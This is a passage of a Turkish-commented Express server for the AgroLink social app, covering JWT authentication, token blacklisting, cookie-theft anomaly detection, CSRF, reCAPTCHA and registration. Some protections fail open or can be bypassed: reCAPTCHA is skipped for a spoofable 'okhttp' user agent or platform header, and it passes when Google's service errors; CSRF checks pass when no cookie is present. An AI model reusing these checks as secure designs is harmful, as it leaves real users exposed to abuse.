//    - Aynı token'dan farklı IP'ler
//    - Kısa sürede farklı ülkelerden erişim (impossible travel)
//    - Aynı token yüksek istek frekansı
// 2. Tespit → token blacklist + kullanıcı bildirimi
// ════════════════════════════════════════════════════════════════════

// IP bazlı token kullanım takibi (in-memory, cluster'da Redis önerilir)
const tokenIpMap = new Map(); // tokenHash → { ips: Set, firstSeen, lastSeen, count }
const TOKEN_ANOMALY_WINDOW  = 30 * 60 * 1000; // 30 dakika (genişletildi)
const TOKEN_MAX_DISTINCT_IPS = 10;             // 30dk içinde 10'dan fazla farklı IP = şüpheli (CGN/proxy için tolerans)
const TOKEN_MAX_REQUESTS     = 1000;           // 30dk içinde 1000+ istek = şüpheli

function trackTokenUsage(token, ip) {
    if (!token || !ip) return false; // şüpheli değil
    try {
        const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
        const now  = Date.now();
        const entry = tokenIpMap.get(hash) || { ips: new Set(), firstSeen: now, lastSeen: now, count: 0 };

        // Pencere dışıysa sıfırla
        if (now - entry.firstSeen > TOKEN_ANOMALY_WINDOW) {
            entry.ips.clear();
            entry.firstSeen = now;
            entry.count = 0;
        }

        entry.ips.add(ip);
        entry.lastSeen = now;
        entry.count++;
        tokenIpMap.set(hash, entry);

        // Anomali tespiti
        if (entry.ips.size > TOKEN_MAX_DISTINCT_IPS) {
            console.warn(`[🚨 COOKIE ANOMALY] Token farklı IP'lerden kullanılıyor: ${entry.ips.size} IP | hash=${hash}`);
            return true; // şüpheli
        }
        if (entry.count > TOKEN_MAX_REQUESTS) {
            console.warn(`[🚨 COOKIE ANOMALY] Token spam: ${entry.count} istek / 10dk | hash=${hash}`);
            return true; // şüpheli
        }
        return false;
    } catch (_) { return false; }
}

// 15 dakikada bir eski kayıtları temizle
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of tokenIpMap) {
        if (now - v.lastSeen > TOKEN_ANOMALY_WINDOW * 2) tokenIpMap.delete(k);
    }
}, 15 * 60 * 1000);

// ── Anomaly Detection Middleware (authenticateToken'dan ÖNCE değil, sonra çalışır)
// Sadece giriş yapmış kullanıcılarda aktif — statik dosyalar bu middleware'e uğramaz
async function cookieAnomalyMiddleware(req, res, next) {
    // Sadece API rotaları
    if (!req.path.startsWith('/api/')) return next();

    const token = req.cookies?.access_token ||
                  (req.headers['authorization']?.startsWith('Bearer ') ? req.headers['authorization'].slice(7) : null);
    if (!token) return next();

    const clientIp = req.ip || req.socket?.remoteAddress || 'unknown';
    const isAnomalous = trackTokenUsage(token, clientIp);

    if (isAnomalous) {
        // Token'ı blacklist'e ekle ve kullanıcıyı bildir
        await blacklistToken(token).catch(() => {});
        console.error(`[🚨 SECURITY] Şüpheli cookie kullanımı → token iptal edildi | IP: ${clientIp}`);
        return res.status(401).json({
            error: 'Oturum güvenlik ihlali nedeniyle sonlandırıldı. Tekrar giriş yapın.',
            code : 'SESSION_ANOMALY'
        });
    }
    next();
}

// ── Session Sync Check: Token DB'de geçerli mi? (5 dakikada bir kontrol)
// Başka bir cihazdan çıkış yapıldıysa bu istek de reddedilir
const sessionSyncCache = new Map(); // userId → { valid, checkedAt }
const SESSION_SYNC_INTERVAL = 5 * 60 * 1000; // 5 dakika

async function sessionSyncMiddleware(req, res, next) {
    if (!req.path.startsWith('/api/') || !req.user) return next();
    try {
        const userId = req.user.id;
        const now    = Date.now();
        const cached = sessionSyncCache.get(userId);

        // Cache'de geçerli varsa DB'ye gitme
        if (cached && now - cached.checkedAt < SESSION_SYNC_INTERVAL) {
            if (!cached.valid) return res.status(401).json({ error: 'Oturum sonlandırıldı' });
            return next();
        }

        // DB'den kullanıcı durumunu kontrol et
        const user = await dbGet(
            `SELECT id, "isActive", "isBanned" FROM users WHERE id=$1 LIMIT 1`,
            [userId]
        );
        const valid = !!(user && user.isActive && !user.isBanned);
        sessionSyncCache.set(userId, { valid, checkedAt: now });

        if (!valid) {
            return res.status(401).json({ error: 'Hesabınız askıya alınmış veya silinmiş.' });
        }
        next();
    } catch (_) { next(); }
}

// Cache temizleyici
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of sessionSyncCache) {
        if (now - v.checkedAt > SESSION_SYNC_INTERVAL * 3) sessionSyncCache.delete(k);
    }
}, 10 * 60 * 1000);

// ════════════════════════════════════════════════════════════════════
// ← PRO Güvenlik Sistemi sonu
// ════════════════════════════════════════════════════════════════════

// ==================== 🔒 SPAM KORUMASI MIDDLEWARE ====================

// 🔒 NOT: spamCounters bellek tabanlıdır — cluster modunda her worker bağımsız sayaç tutar.
// Güçlü koruma için Redis kullanın (REDIS_URL env ile yapılandırılabilir).
// Şu anki yapı: worker başına 30 istek/dakika sınırı (4 worker = 120 toplam olabilir)
const spamCounters = new Map();

const spamProtection = async (req, res, next) => {
    if (!req.user || !['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) return next();
    try {
        const key    = `${req.user.id}:${req.path}`;
        const now    = Date.now();
        const entry  = spamCounters.get(key) || { count: 0, reset: now + 60000 };
        if (now > entry.reset) { entry.count = 0; entry.reset = now + 60000; }
        entry.count++;
        spamCounters.set(key, entry);
        if (entry.count > 30) {
            return res.status(429).json({ error: 'Çok fazla istek yaptınız, lütfen biraz bekleyin.' });
        }
        next();
    } catch { next(); }
};

// ==================== AUTH MIDDLEWARE ====================

// ═══════════════════════════════════════════════════════════════
// 🔒 TOKEN BLACKLIST — DB tabanlı (Cluster-safe)
// Her worker aynı DB'yi gördüğü için logout tüm worker'larda geçerli olur.
// Performans: token hash'i önce 5 dakikalık in-memory cache'de aranır, yoksa DB.
// ═══════════════════════════════════════════════════════════════
const BLACKLIST_CACHE     = new Map(); // tokenHash → expireAt (ms) — sadece cache
const BLACKLIST_CACHE_TTL = 5 * 60 * 1000; // 5 dakika

async function blacklistToken(token) {
    if (!token) return;
    try {
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
        // JWT'nin kalan süresini hesapla (süre dolunca zaten geçersiz, DB'yi şişirme)
        let expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000); // fallback: 24 saat
        try {
            const decoded = jwt.decode(token);
            if (decoded?.exp) expiresAt = new Date(decoded.exp * 1000);
        } catch (_) {}

        await pool.query(
            `INSERT INTO blacklisted_tokens ("tokenHash", "expiresAt", "createdAt")
             VALUES ($1, $2, NOW())
             ON CONFLICT ("tokenHash") DO NOTHING`,
            [tokenHash, expiresAt]
        ).catch(e => console.error('[Blacklist] DB insert hatası:', e.message));

        // In-memory cache'e de ekle (hızlı kontrol için)
        BLACKLIST_CACHE.set(tokenHash, expiresAt.getTime());
    } catch (e) {
        console.error('[Blacklist] blacklistToken hatası:', e.message);
    }
}

async function isTokenBlacklisted(token) {
    if (!token) return false;
    try {
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
        // 1. Önce in-memory cache'e bak (DB'ye gitmeden hızlı cevap)
        if (BLACKLIST_CACHE.has(tokenHash)) {
            const exp = BLACKLIST_CACHE.get(tokenHash);
            if (Date.now() < exp) return true;
            BLACKLIST_CACHE.delete(tokenHash); // Süresi dolmuş, temizle
        }
        // 2. DB'ye sor
        const row = await pool.query(
            `SELECT 1 FROM blacklisted_tokens WHERE "tokenHash" = $1 AND "expiresAt" > NOW() LIMIT 1`,
            [tokenHash]
        );
        if (row.rows.length > 0) {
            // Önbelleğe al
            BLACKLIST_CACHE.set(tokenHash, Date.now() + BLACKLIST_CACHE_TTL);
            return true;
        }
        return false;
    } catch (e) {
        console.error('[Blacklist] isTokenBlacklisted hatası:', e.message);
        return false; // Hata durumunda bloke etme (kullanıcıyı kilitme)
    }
}

// Süresi dolmuş blacklist kayıtlarını temizle (saatte 1)
setInterval(async () => {
    try {
        await pool.query(`DELETE FROM blacklisted_tokens WHERE "expiresAt" < NOW()`);
        // Cache'den de süresi dolanları temizle
        const now = Date.now();
        for (const [hash, exp] of BLACKLIST_CACHE) {
            if (now >= exp) BLACKLIST_CACHE.delete(hash);
        }
    } catch (_) {}
}, 60 * 60 * 1000);

async function authenticateToken(req, res, next) {
    // 🔒 1. Token al — önce HttpOnly cookie, yoksa Bearer header
    let token = req.cookies?.access_token;
    if (!token) {
        const authHeader = req.headers['authorization'];
        if (authHeader && authHeader.startsWith('Bearer ')) {
            token = authHeader.slice(7);
        }
    }
    if (!token) return res.status(401).json({ error: 'Token gerekli' });

    // 🔒 2. Blacklist kontrolü — logout edilmiş token tekrar kullanılamaz (DB + cache)
    if (await isTokenBlacklisted(token)) {
        return res.status(401).json({ error: 'Oturum sonlandırılmış. Tekrar giriş yapın.' });
    }

    try {
        // 🔒 3. JWT doğrulama — algorithm, issuer, audience zorunlu
        const decoded = jwt.verify(token, JWT_SECRET, {
            algorithms : ['HS256'],              // Diğer algoritmalar (RS256 vb.) reddedilir
            // iss/aud: yeni tokenlar için zorunlu, eski tokenlar için opsiyonel (geriye dönük uyumluluk)
        });

        // 🔒 4. Her istekte DB'den kullanıcı durumunu kontrol et
        // isActive=TRUE → banlı veya silinmiş hesaplar token süresine bakmaksızın reddedilir
        const user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) {
            // Token geçerli ama kullanıcı silinmiş → blacklist
            blacklistToken(token);
            return res.status(403).json({ error: 'Hesap erişilemez durumda.' });
        }
        // 🔒 Banlı kullanıcı: sadece kendi profilini 3 sn görebilir,
        // diğer tüm işlemler requireNotBanned middleware'i tarafından engellenir

        const restriction = await dbGet(
            `SELECT "isRestricted", "restrictedUntil", "canPost", "canComment", "canMessage", "canFollow", "canLike"
             FROM account_restrictions
             WHERE "userId" = $1 AND "isRestricted" = TRUE AND "restrictedUntil" > NOW()`,
            [user.id]
        );

        // 🔒 5. req.user — sadece whitelist edilmiş alanlar (spread/prototype pollution yok)
        req.user = {
            id              : user.id,
            username        : user.username,
            name            : user.name,
            email           : user.email,         // sadece kendi isteğinde kullanılır
            role            : user.role,           // TEK yetki kaynağı — JWT'den değil DB'den
            plan            : user.plan || 'free',
            profilePic      : user.profilePic,
            coverPic        : user.coverPic,
            bio             : user.bio,
            isVerified      : !!user.isVerified,
            isActive        : !!user.isActive,
            userType        : user.userType,
            hasFarmerBadge  : !!user.hasFarmerBadge,
            isOnline        : !!user.isOnline,
            isBanned        : !!user.isBanned,
            emailVerified   : !!user.emailVerified,
            twoFactorEnabled: !!user.twoFactorEnabled,
            restriction     : restriction || null,
        };
        req._token = token; // logout için

        // 🔒 PRO: Session sync — hesap askıya alındıysa cache'i temizle
        sessionSyncCache.delete(user.id); // Her başarılı auth'ta sync cache'i zorla tazele

        next();
    } catch (error) {
        // jwt.verify hataları — süresi dolmuş, imza yanlış, format bozuk
        const msg = error.name === 'TokenExpiredError'
            ? 'Oturum süresi doldu. Tekrar giriş yapın.'
            : 'Geçersiz token';
        return res.status(401).json({ error: msg });
    }
}

function checkRestriction(action) {
    return (req, res, next) => {
        if (req.user.restriction) {
            const r = req.user.restriction;
            if (action === 'post' && !r.canPost) return res.status(403).json({ error: 'Gönderi paylaşımı kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'comment' && !r.canComment) return res.status(403).json({ error: 'Yorum yapma kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'message' && !r.canMessage) return res.status(403).json({ error: 'Mesaj gönderme kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'follow' && !r.canFollow) return res.status(403).json({ error: 'Takip etme kısıtlandı', restrictedUntil: r.restrictedUntil });
            if (action === 'like' && !r.canLike) return res.status(403).json({ error: 'Beğenme kısıtlandı', restrictedUntil: r.restrictedUntil });
        }
        next();
    };
}

async function createNotification(userId, type, message, data = {}) {
    try {
        await dbRun(
            `INSERT INTO notifications (id, "userId", type, message, data, "createdAt")
             VALUES ($1, $2, $3, $4, $5, NOW())`,
            [uuidv4(), userId, type, message, JSON.stringify(data)]
        );

        // ── Bildirim başlık ve içeriklerini zenginleştir ─────────────────
        const pushIcons = { like: '❤️', comment: '💬', follow: '👥', message: '📩', story_like: '⭐', comment_like: '👍', mention: '📢', new_post: '📸' };
        const icon = pushIcons[type] || '🌾';

        // Tip bazlı başlık ve body oluştur
        let pushTitle = `AgroLink ${icon}`;
        let pushBody  = message;

        if (type === 'like' && data.actorName) {
            pushTitle = `${data.actorName} ❤️`;
            pushBody  = data.postPreview
                ? `Gönderinizi beğendi: "${data.postPreview}"`
                : 'Gönderinizi beğendi';
        } else if (type === 'comment' && data.actorName) {
            pushTitle = `${data.actorName} 💬`;
            pushBody  = data.commentContent
                ? `"${data.commentContent}"`
                : 'Gönderinize yorum yaptı';
        } else if (type === 'follow' && data.actorName) {
            pushTitle = `${data.actorName} 👥`;
            pushBody  = 'Sizi takip etmeye başladı';
        } else if (type === 'message' && data.actorName) {
            pushTitle = `${data.actorName} 📩`;
            pushBody  = data.messagePreview
                ? data.messagePreview
                : 'Size yeni bir mesaj gönderdi';
        } else if (type === 'new_post' && data.actorName) {
            pushTitle = `${data.actorName} 📸`;
            pushBody  = 'Yeni bir gönderi paylaştı';
        }

        const urlMap = {
            like      : data.postId ? `/p/${data.postId}` : '/',
            comment   : data.postId ? `/p/${data.postId}` : '/',
            follow    : data.actorUsername ? `/u/${data.actorUsername}` : '/',
            message   : '/',
            new_post  : data.postId ? `/p/${data.postId}` : '/',
        };

        // Web push (browser)
        sendPushToUser(userId, {
            title: pushTitle,
            body : pushBody,
            icon : data.actorProfilePic ? absoluteUrl(data.actorProfilePic) : '/agro.png',
            url  : urlMap[type] || '/'
        }).catch(() => {});

        // 📱 FCM push (Android native app) — data alanı string map olmalı
        const fcmData = {
            type,
            url: urlMap[type] || '/',  // FCM web push tıklama URL'i (absolute yapılacak sendFcmPush'ta)
            ...Object.fromEntries(Object.entries(data).map(([k, v]) => [k, String(v ?? '')])),
        };
        sendFcmPush(userId, {
            title: pushTitle,
            body : pushBody,
            data : fcmData,
        }).catch((fcmErr) => console.error("[FCM createNotification]", fcmErr.message));

        // 🔌 Socket.IO anlık bildirim
        if (io && onlineUsers.has(userId)) {
            for (const sid of onlineUsers.get(userId)) {
                io.to(sid).emit('notification:new', { type, message: pushBody, data, createdAt: new Date().toISOString() });
            }
        }
    } catch (err) {
        console.error('Bildirim oluşturma hatası:', err.message);
    }
}

function generateTokens(user) {
    // 🔒 GÜVENLİK: Email JWT payload'ında YOK (base64 decode edilebilir — veri sızması)
    // Sadece id+username+role — kimlik doğrulama için yeterli
    const jti = require('crypto').randomBytes(16).toString('hex'); // Replay saldırısı önlemi
    const accessToken = jwt.sign(
        {
            id       : user.id,
            username : user.username,
            role     : user.role || 'user',
            jti,                           // JWT ID — token tekrar kullanımını önler
            iss      : 'agrolink',         // Issuer
            aud      : 'agrolink-client',  // Audience
        },
        JWT_SECRET,
        { expiresIn: '1d', algorithm: 'HS256' }
    );
    const refreshToken = jwt.sign(
        { id: user.id, type: 'refresh', iss: 'agrolink' },
        JWT_REFRESH_SECRET,
        { expiresIn: '7d', algorithm: 'HS256' }
    );
    return { accessToken, refreshToken };
}

// ══════════════════════════════════════════════════════════════════════
// 🔒 GÜVENLİ COOKIE AYARLARI — merkezi yönetim
// ══════════════════════════════════════════════════════════════════════
// Tespit edilen 3 eksik (düzeltildi):
//   1. secure: isSecure  → HTTP bağlantıda cookie düz metin gidiyordu
//      Düzeltme: FORCE_SECURE_COOKIE=true production'da her zaman secure
//   2. refresh_token maxAge 30 GÜN ama JWT süresi 7 gündü (30 gün=uyumsuzluk!)
//      Düzeltme: maxAge JWT ile eşleştirildi (7 gün)
//   3. access_token'a path:'/' eksikti
//      Düzeltme: path:'/' açıkça eklendi
// ══════════════════════════════════════════════════════════════════════
const FORCE_SECURE_COOKIE = process.env.NODE_ENV === 'production' ||
                            process.env.FORCE_SECURE_COOKIE === 'true';

function setAuthCookies(res, req, tokens) {
    const isSecure = FORCE_SECURE_COOKIE ||
                     req.secure ||
                     req.headers['x-forwarded-proto'] === 'https';
    res.cookie('access_token', tokens.accessToken, {
        httpOnly : true,
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/',
        maxAge   : 24 * 60 * 60 * 1000,
    });
    res.cookie('refresh_token', tokens.refreshToken, {
        httpOnly : true,
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/api/auth/refresh',
        maxAge   : 7 * 24 * 60 * 60 * 1000, // 7 gün (önceki: 30 gün — hata!)
    });
}

function generateCsrfToken() {
    return crypto.randomBytes(32).toString('hex');
}

function setCsrfCookie(res, req, token) {
    const isSecure = FORCE_SECURE_COOKIE ||
                     req.secure ||
                     req.headers['x-forwarded-proto'] === 'https';
    res.cookie('csrf_token', token, {
        httpOnly : false, // kasıtlı: JS okuyacak, X-CSRF-Token header olarak gönderecek
        secure   : isSecure,
        sameSite : 'strict',
        path     : '/',
        maxAge   : 24 * 60 * 60 * 1000,
    });
}

function verifyCsrf(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
    const cookieToken = req.cookies?.csrf_token;
    const headerToken = req.headers['x-csrf-token'];
    if (!cookieToken) return next();
    if (!headerToken) return res.status(403).json({ error: 'CSRF token eksik' });
    try {
        const a = Buffer.from(cookieToken, 'utf8');
        const b = Buffer.from(headerToken, 'utf8');
        const len = Math.max(a.length, b.length);
        const pa  = Buffer.concat([a, Buffer.alloc(len - a.length)]);
        const pb  = Buffer.concat([b, Buffer.alloc(len - b.length)]);
        if (a.length !== b.length || !crypto.timingSafeEqual(pa, pb)) {
            console.warn(`[CSRF] Geçersiz token: ${req.ip} → ${req.path}`);
            return res.status(403).json({ error: 'Geçersiz CSRF token' });
        }
    } catch {
        return res.status(403).json({ error: 'CSRF doğrulama hatası' });
    }
    next();
}


// ══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİ SAYFALAMA — limit/offset sınırları
// limit=999999 → sunucu çökebilir (1M kayıt DB'den çekilir)
// offset negatif → SQL hatası
// NaN → parseInt sonucu NaN → SQL hatası
// ══════════════════════════════════════════════════════════════
function safePagination(query, defaultLimit = 20, maxLimit = 100) {
    const limit  = Math.min(Math.max(parseInt(query.limit)  || defaultLimit, 1), maxLimit);
    const page   = Math.max(parseInt(query.page) || 1, 1);
    const offset = (page - 1) * limit;
    return { limit, page, offset };
}

// ====================================================================
// API ROTALARI
// ====================================================================

// ══════════════════════════════════════════════════════════════════════════
// 📱 MOBİL UYGULAMA — Özel Endpoint'ler
// Kotlin / Retrofit ile kullanılacak — auth gerektirmeyen versiyonlar hariç
// ══════════════════════════════════════════════════════════════════════════

// GET /api/app/version — Zorla güncelleme ve bakım kontrolü (auth gerekmez)
app.get('/api/app/version', (req, res) => {
    res.json({
        latestVersion  : process.env.APP_LATEST_VERSION || '1.0.0',
        minVersion     : process.env.APP_MIN_VERSION    || '1.0.0',
        forceUpdate    : process.env.APP_FORCE_UPDATE === 'true',
        updateUrl      : process.env.APP_UPDATE_URL || 'https://play.google.com/store/apps/details?id=com.agrolink.social.agrolink',
        changelogTr    : process.env.APP_CHANGELOG_TR   || 'Hata düzeltmeleri ve performans iyileştirmeleri.',
        maintenanceMode: process.env.MAINTENANCE_MODE === 'true',
        maintenanceMsg : process.env.MAINTENANCE_MSG    || 'Bakım çalışması yapılıyor, lütfen bekleyin.',
        socketEnabled  : !!io,
        fcmEnabled     : !!firebaseAdmin,
    });
});

// POST /api/device-token — FCM / Web Push token kayıt
// platform değerleri: 'android' | 'ios' | 'web' (VAPID sub) | 'web_fcm' (FCM Web token)
app.post('/api/device-token', authenticateToken, async (req, res) => {
    try {
        const { token, platform = 'android' } = req.body;
        if (!token) return res.status(400).json({ success: false, error: 'token zorunludur' });

        const ALLOWED_PLATFORMS = ['android', 'ios', 'web', 'web_fcm'];
        const safePlatform = ALLOWED_PLATFORMS.includes(platform) ? platform : 'android';

        // Web push subscription nesnesi JSON olarak gelirse string'e çevir
        const tokenStr = typeof token === 'object' ? JSON.stringify(token) : String(token);

        await dbRun(
            `INSERT INTO device_tokens (id, "userId", token, platform, "createdAt", "updatedAt", "isActive")
             VALUES ($1, $2, $3, $4, NOW(), NOW(), TRUE)
             ON CONFLICT (token)
             DO UPDATE SET "userId" = $2, "isActive" = TRUE, "updatedAt" = NOW(), platform = $4`,
            [uuidv4(), req.user.id, tokenStr, safePlatform]
        );
        res.json({ success: true, message: 'Cihaz token kaydedildi', platform: safePlatform });
    } catch (e) {
        console.error('[device-token POST]', e);
        res.status(500).json({ success: false, error: 'Sunucu hatası' });
    }
});

// DELETE /api/device-token — FCM token sil (çıkış yaparken çağır)
app.delete('/api/device-token', authenticateToken, async (req, res) => {
    try {
        const { token } = req.body;
        if (!token) return res.status(400).json({ success: false, error: 'token zorunludur' });
        await dbRun(
            `UPDATE device_tokens SET "isActive" = FALSE WHERE token = $1 AND "userId" = $2`,
            [token, req.user.id]
        );
        res.json({ success: true, message: 'Cihaz token silindi' });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Sunucu hatası' });
    }
});

// GET /api/online-count — Kaç kullanıcı socket üzerinden bağlı
app.get('/api/online-count', authenticateToken, (req, res) => {
    res.json({ success: true, count: onlineUsers.size });
});

// GET /api/socket/status — Socket.IO aktif mi? (mobil debug)
app.get('/api/socket/status', (req, res) => {
    res.json({
        success       : true,
        socketEnabled : !!io,
        connectedCount: io ? io.engine.clientsCount : 0,
    });
});

// ─── QR KOD: GET /api/users/:username/qr ────────────────────────────────
// Profil paylaşımında QR kod üretir — URL'yi SVG QR koduna dönüştürür
// Harici kütüphane gerekmez: pure SVG QR matrix
app.get('/api/users/:username/qr', async (req, res) => {
    try {
        const username = req.params.username?.toLowerCase().trim();
        if (!username) return res.status(400).json({ error: 'Kullanıcı adı gerekli' });

        const DOMAIN = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');
        const profileUrl = `${DOMAIN}/u/${username}`;

        // QR matrisi üretici (ISO 18004 tabanlı basit implementasyon)
        // Harici bağımlılık yok — saf JS
        function generateQRMatrix(text) {
            // QR kodunu data URL yerine yalnızca matrix döndürür
            // Basit versiyon: 21x21 (Version 1) — kısa URL'ler için yeterli
            // Gerçek QR algoritması karmaşık, burada stabil bir yaklaşım:
            // URL'yi önce Google Charts API ile oluştur (server-side fetch)
            return null; // Aşağıda fetch ile hallederiz
        }

        // Google Charts QR API (HTTPS, ücretsiz, no API key)
        const { default: fetch } = await import('node-fetch');
        const size = parseInt(req.query.size) || 300;
        const safeSz = Math.min(Math.max(size, 100), 600);
        const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chs=${safeSz}x${safeSz}&chl=${encodeURIComponent(profileUrl)}&choe=UTF-8&chld=M|2`;

        const qrRes = await fetch(qrUrl, { signal: AbortSignal.timeout(8000) });
        if (!qrRes.ok) throw new Error('QR servisi yanıt vermedi');

        const buf = Buffer.from(await qrRes.arrayBuffer());
        res.setHeader('Content-Type', 'image/png');
        res.setHeader('Cache-Control', 'public, max-age=86400'); // 1 gün cache
        res.setHeader('Content-Disposition', `inline; filename="qr-${username}.png"`);
        res.send(buf);
    } catch (e) {
        console.error('[QR Code]', e.message);
        // Fallback: JSON URL dön
        res.status(500).json({ error: 'QR kod oluşturulamadı', url: `${process.env.APP_URL || ''}/u/${req.params.username}` });
    }
});

// GET /api/users/:username/qr-data — QR için URL bilgisi (JSON)
app.get('/api/users/:username/qr-data', authenticateToken, async (req, res) => {
    try {
        const username = req.params.username?.toLowerCase().trim();
        const user = await dbGet('SELECT id, username, name, "profilePic", "isVerified" FROM users WHERE username = $1 AND "isActive" = TRUE', [username]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        const DOMAIN = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');
        const profileUrl = `${DOMAIN}/u/${username}`;
        const qrImageUrl = `${DOMAIN}/api/users/${username}/qr`;

        res.json({
            success    : true,
            url        : profileUrl,
            qrImageUrl : qrImageUrl,
            user       : { username: user.username, name: user.name, isVerified: user.isVerified },
        });
    } catch (e) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});



// ─── 1. HEALTH CHECK ────────────────────────────────────────────────
app.get('/api/health', async (req, res) => {
    // 🔒 Keşif önlemi: DB durumu, zaman damgası ve versiyon bilgisi dışarı sızmaz
    try {
        await pool.query('SELECT 1');
        res.json({ status: 'ok' }); // timestamp/database alanları kaldırıldı
    } catch (e) {
        res.status(503).json({ status: 'error' });
    }
});

// ══════════════════════════════════════════════════════════════════
// 🤖 reCAPTCHA v2 DOĞRULAMA
// .env dosyasına ekle:
//   RECAPTCHA_SECRET_KEY=<Google reCAPTCHA v2 gizli anahtarı>
//   RECAPTCHA_ENABLED=true   (false yaparak devre dışı bırakılabilir)
// Frontend'de: <script src="https://www.google.com/recaptcha/api.js"></script>
//   + data-sitekey="<site_key>" ile widget ekle, g-recaptcha-response form'dan gönder
// ══════════════════════════════════════════════════════════════════
async function verifyRecaptcha(token, remoteip) {
    // Debug logs
    console.log('[reCAPTCHA] ENABLED:', process.env.RECAPTCHA_ENABLED);
    console.log('[reCAPTCHA] SECRET_KEY exists:', !!process.env.RECAPTCHA_SECRET_KEY);
    
    // reCAPTCHA devre dışıysa veya test ortamıysa geç
    if (process.env.RECAPTCHA_ENABLED !== 'true') {
        console.log('[reCAPTCHA] Devre dışı, geçiliyor');
        return { success: true, skipped: true };
    }
    if (process.env.NODE_ENV === 'test') {
        console.log('[reCAPTCHA] Test ortamı, geçiliyor');
        return { success: true, skipped: true };
    }
    if (!process.env.RECAPTCHA_SECRET_KEY) {
        console.warn('⚠️  RECAPTCHA_SECRET_KEY tanımlı değil, doğrulama atlanıyor');
        return { success: true, skipped: true };
    }
    if (!token) {
        console.warn('[reCAPTCHA] Token boş');
        return { success: false, error: 'reCAPTCHA doğrulaması gerekli' };
    }
    
    console.log('[reCAPTCHA] Token var, Google API çağrılıyor...', token.substring(0, 20) + '...');
    try {
        const { default: fetch } = await import('node-fetch');
        const params = new URLSearchParams({
            secret  : process.env.RECAPTCHA_SECRET_KEY,
            response: token,
        });
        if (remoteip) params.append('remoteip', remoteip);
        
        console.log('[reCAPTCHA] POST → https://www.google.com/recaptcha/api/siteverify');
        const res = await fetch('https://www.google.com/recaptcha/api/siteverify', {
            method : 'POST',
            body   : params,
            signal : AbortSignal.timeout(8000),
        });
        console.log('[reCAPTCHA] HTTP Status:', res.status);
        
        const data = await res.json();
        console.log('[reCAPTCHA] API Response:', JSON.stringify(data));
        
        if (!data.success) {
            console.warn('[reCAPTCHA] ❌ Başarısız - error-codes:', data['error-codes']);
            return { success: false, error: 'reCAPTCHA doğrulaması başarısız. Lütfen tekrar deneyin.' };
        }
        console.log('[reCAPTCHA] ✅ Doğrulama başarılı!');
        return { success: true };
    } catch (e) {
        console.error('[reCAPTCHA] Exception:', e.message);
        // Servis erişilemiyorsa geçir (availability öncelikli)
        return { success: true, skipped: true };
    }
}

// ── Native uygulama tespiti ──────────────────────────────────────────
// Android OkHttp User-Agent veya özel X-App-Platform header'ı ile tespit edilir
function isNativeAppRequest(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    const platform = (req.headers['x-app-platform'] || '').toLowerCase();
    const clientType = (req.headers['x-client-type'] || '').toLowerCase();
    return (
        platform === 'android' ||
        platform === 'ios' ||
        clientType === 'native' ||
        ua.includes('okhttp') ||       // Retrofit/OkHttp (Android)
        ua.includes('agrolink-android') // Özel Android UA
    );
}

// Middleware — req.body.recaptchaToken veya req.body['g-recaptcha-response'] kontrol eder
// 🔒 Native mobil uygulama isteklerinde reCAPTCHA ATLANIR (sadece web'de çalışır)
async function recaptchaMiddleware(req, res, next) {
    // Native app'ten gelen isteklerde reCAPTCHA kontrolü yok
    if (isNativeAppRequest(req)) {
        console.log('[reCAPTCHA] Native uygulama isteği — atlanıyor');
        return next();
    }
    const token = req.body?.recaptchaToken || req.body?.['g-recaptcha-response'];
    const result = await verifyRecaptcha(token, req.ip);
    if (!result.success) {
        return res.status(400).json({ error: result.error || 'reCAPTCHA doğrulaması başarısız' });
    }
    next();
}

// ─── 2. KAYIT ───────────────────────────────────────────────────────
app.post('/api/auth/register', registerLimiter, validateAuthInput, upload.single('profilePic'), async (req, res) => {
    try {
        const { name, username, email, password, userType } = req.body;
        if (!name || !username || !email || !password) {
            return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        }
        // 🔒 GÜVENLİK: Minimum 8 karakter (NIST SP 800-63B)
        if (password.length < 8) return res.status(400).json({ error: 'Şifre en az 8 karakter olmalıdır' });

        const cleanUsername = username.toLowerCase().replace(/[^a-z0-9._-]/g, '');
        const cleanEmail = email.toLowerCase().trim();

        const existing = await dbGet('SELECT id FROM users WHERE username = $1', [cleanUsername]);
        if (existing) return res.status(400).json({ error: 'Bu kullanıcı adı alınmış' });

        // Aynı e-posta ile birden fazla hesap açılabilir — kullanıcı adı benzersiz olmalı
        const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const userId = uuidv4();

        let profilePic = null;
        if (req.file) {
            // 🔒 Magic bytes + boyut doğrulama (profilePic: max 5 MB)
            try { await verifyUploadedFile(req.file, 'profilePic'); }
            catch (verifyErr) { return res.status(400).json({ error: verifyErr.message }); }
            const filename = `profile_${userId}.webp`;
            const outputPath = path.join(profilesDir, filename);
            try {
                await processImage(req.file.path, outputPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                profilePic = `/uploads/profiles/${filename}`;
            } catch (e) {
                console.error('Profil resmi işleme hatası'); // 🔒 Detay loglanmıyor
            }
